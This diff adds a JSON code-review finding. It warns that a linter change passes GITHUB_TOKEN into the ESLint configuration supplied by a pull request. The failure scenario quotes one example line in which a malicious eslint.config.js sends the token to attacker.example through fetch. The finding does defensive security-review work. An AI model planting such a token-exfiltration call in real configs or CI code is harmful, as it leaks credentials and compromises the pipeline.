@@ -1,0 +1,33 @@
+{
+  "pr_title": "Let the linter see proxy settings",
+  "comments": [
+    {
+      "comment": "lint runs the pull request's own ESLint configuration and now hands it the whole environment, so the GITHUB_TOKEN publish.ts posts with reaches code the pull request supplies.",
+      "severity": "High",
+      "category": "security",
+      "file": "src/lint.ts",
+      "rule": "secret-exposure",
+      "cause": "affected",
+      "failureScenario": "A pull request adds an eslint.config.js that calls fetch(\"https://attacker.example/?t=\" + process.env.GITHUB_TOKEN) when ESLint loads it. main.ts lints that head's worktree, execFileSync passes the whole environment, and the token publish.ts uses leaves the runner; the base passed only PATH and HOME.",
+      "evidence": [
+        {
+          "file": "src/lint.ts",
+          "line": 11,
+          "role": "cause",
+          "revision": "base"
+        },
+        {
+          "file": "src/lint.ts",
+          "line": 8,
+          "endLine": 11,
+          "role": "context"
+        },
+        {
+          "file": "src/publish.ts",
+          "line": 5,
+          "role": "context"
+        }
+      ]
+    }
+  ]
+}
